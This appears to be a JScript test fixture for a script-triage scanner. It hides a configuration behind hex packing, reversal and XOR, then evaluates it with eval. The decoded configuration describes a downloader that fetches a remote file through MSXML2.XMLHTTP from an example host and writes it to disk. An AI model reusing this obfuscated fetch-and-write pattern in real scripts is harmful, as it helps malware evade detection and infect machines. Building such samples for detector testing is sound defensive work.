// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_f4a46993 = function decode_f4a46993_body(storedMaterial) {
  var recoveredMaterial = storedMaterial.slice(0);
  recoveredMaterial.reverse();
  for (var i = 0; i < recoveredMaterial.length; i++) { recoveredMaterial[i] = recoveredMaterial[i] ^ 155; }
  return recoveredMaterial;
};
var recover_000135b8 = function recover_000135b8_body() {
  var packedText = "%e6%a9%a1%b9%ef%f5%ee%f4%d8%fe%fc%fa%ef%e8%b9%b7%e6%b9%ef%fa%ff%b5%fa%ae%a3%a2%a8%f8%fa%ae%a8%aa%b6%fe%fc%fa%ef%e8%c7%c7%f9%fa%d7%e8%e8%fe%e9%ef%f5%ee%d3%c7%c7%f8%f2%f7%f9%ee%cb%c7%c7%e8%e9%fe%e8%ce%c7%c7%a1%d8%b9%a1%b9%f3%ef%fa%eb%c4%fe%f7%f2%fd%b9%b7%b9%fa%ae%a3%a2%a8%f8%fa%ae%a8%aa%b4%f9%fa%d7%e8%e8%fe%e9%ef%f5%ee%d3%b9%a1%b9%ef%f5%fe%fc%fa%c4%e9%fe%e8%ee%b9%b7%b9%ef%fa%ff%b5%fa%af%ff%a9%ab%ff%f9%a3%b4%ff%f2%f7%fa%ed%f5%f2%b5%fe%f7%eb%f6%fa%e3%fe%b5%fa%ae%a3%a2%a8%f8%fa%ae%a8%aa%b4%b4%a1%e8%eb%ef%ef%f3%b9%a1%b9%f7%e9%ee%b9%b7%b9%fa%ae%a3%a2%a8%f8%fa%ae%a8%aa%b6%f5%fc%f2%fa%eb%f6%fa%f8%b9%a1%b9%ff%f2%c4%f5%fc%f2%fa%eb%f6%fa%f8%b9%e0%a1%b9%e8%fe%ee%f7%fa%ed%b9%b7%b9%ab%b5%ad%b5%cb%cf%cf%d3%d7%d6%c3%b5%a9%d7%d6%c3%c8%d6%b9%a1%b9%e9%fe%ef%eb%fa%ff%fa%b9%b7%c6%b9%fe%f7%f2%fd%c4%fe%ef%f2%e9%ec%b9%b7%b9%fe%ef%f4%f6%fe%e9%c4%fe%e9%f2%ee%ea%f8%fa%b9%c0%a1%b9%e8%eb%fe%ef%e8%b9%e0";
  var storedMaterial = [];
  for (var pi = 0; pi < packedText.length; pi += 3) { storedMaterial.push(parseInt(packedText.substr(pi + 1, 2), 16)); }
  var harmlessValue = ["north", "south"].join(":");
  var recoveredMaterial = [];
  var pass = 0;
  while (pass < 1) { recoveredMaterial = decode_f4a46993.apply(null, [storedMaterial]); pass++; }
  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "", bi = 1;
  for (bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
};
var inspect_1e21629d = function inspect_1e21629d_body() {
  var configuration = eval("(" + recover_000135b8.apply(null, []) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.apply(null, []), adapter: configuration.adapter, values: table.values.apply(null, []), stageCount: configuration.stageCount };
};
